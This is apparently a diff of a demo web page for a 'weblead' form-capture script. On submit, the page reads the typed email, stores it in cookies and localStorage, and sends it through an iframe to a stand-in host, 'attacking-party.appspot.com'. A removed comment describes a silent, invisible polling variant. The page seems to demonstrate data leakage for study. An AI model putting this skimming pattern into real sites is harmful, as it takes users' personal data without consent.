@@ -40,44 +40,83 @@ textarea {
   resize: none;
 }
 
-.right {
-    float: right;
+.topleft {
+	z-index: 1000;
+    position: absolute;
+    top: 0;
+    left: 0;
     width: 300px;
     background-color: #b0e0e6;
+    word-wrap: break-word;
 }
 </style>
         
 <script type="text/javascript">
+function removeCookies() {
+	document.cookie = "weblead_email=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
+	document.cookie = "weblead_url=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path =/";
+	listCookies();
+}
+
+function removeStorage() {
+	localStorage.removeItem("weblead_email");
+	localStorage.removeItem("weblead_url");
+	listStorage();
+}
+
+function listCookies() {
+    var cookies = document.cookie.split(";");
+    var log = document.getElementById('cookies_log');
+    while (log.firstChild) {
+    	log.removeChild(log.firstChild);
+	}
+    for (var i = 0; i < cookies.length; ++i) {
+    	if (cookies[i].indexOf("weblead") !== -1) {
+    		var para = document.createElement("P");
+    		var t = document.createTextNode(cookies[i]);
+        	para.appendChild(t);
+        	log.appendChild(para);
+    	}
+    }
+}
+
+function listStorage() {
+    var log = document.getElementById('storage_log');
+	while (log.firstChild) {
+    	log.removeChild(log.firstChild);
+	}
+    for (var i = 0; i < localStorage.length; ++i) {
+	    var k = localStorage.key(i);
+    	if (k.indexOf("weblead") !== -1) {
+	  		var v = localStorage.getItem(k);
+	  		var para = document.createElement("P");
+    		var t = document.createTextNode( k + ", " + v);
+	  		para.appendChild(t);
+	  		log.appendChild(para);
+    	}
+	}
+}
+
 window.onload = function start() {
-	// Starting the reccurent form capturing
-	/*
-	window.setInterval(function () {
-		// Real weblead may iterate over all forms and inputs
-        var mail = document.getElementById('test_form').elements[0].value;
-        // In reality iframe would be invisible
-        
-        //var frame = document.createElement("iframe");
-        //frame.setAttribute('frameborder', '0');
-		//frame.setAttribute('src', 'http://attacking-party.appspot.com/email?email=' + mail);
-		//var log = document.getElementById('capture_log')
-		//log.removeChild(log.childNodes[0]);
-		//log.appendChild(frame);
-		
-		var frame = document.getElementById('capture_log')
-		frame.setAttribute('src', 'http://attacking-party.appspot.com/email?email=' + mail);
-		
-    }, 5000);
-  	*/
+	listCookies();
+	listStorage();
 }
 
 function submitHandler() {
-	var mail = document.getElementById('test_form').elements[0].value;
-	var frame = document.getElementById('capture_log')
-	frame.setAttribute('src', 'http://attacking-party.appspot.com/email?email=' + mail);
+	var mail = document.getElementById('test_form').elements[1].value;
+	// Save and show cookie
+	document.cookie="weblead_email=" + escape(mail) + "; path=/";
+	listCookies();
+	// Svae and show storage
+	localStorage.setItem("weblead_email", escape(mail));
+	listStorage();
+	// Send by reloading iFrame
+	var frame = document.getElementById('capture_log');
+	frame.setAttribute('src', 'http://attacking-party.appspot.com/email?email=' + escape(mail));
 	setTimeout(function() { 
 		alert("Transition to the landing page"); 
 		document.forms[0].submit(); 
-	}, 1000); 
+	}, 2000); 
 	return false;                    
 }
 </script>
@@ -108,13 +147,15 @@ function submitHandler() {
 
 <div>
 	<h3>Weblead script's output onSubmit:</h3>
-	<iframe id='capture_log' src="http://attacking-party.appspot.com/email" seamless></iframe>
+	<iframe id='capture_log' src="http://attacking-party.appspot.com/email" width="300" height="150" seamless></iframe>
 </div>
 
 </div>
 
-<div class="right">
-	<h3>Cookies and Storage::</h3>
+<div class="topleft">
+	<h3>Cookies:</h3><div id="cookies_log"></div>
+	<h3>Storage:</h3><div id="storage_log"></div>
+	<button onclick="removeCookies(); removeStorage();">Clear all</button>
 </div>
 
 </body>
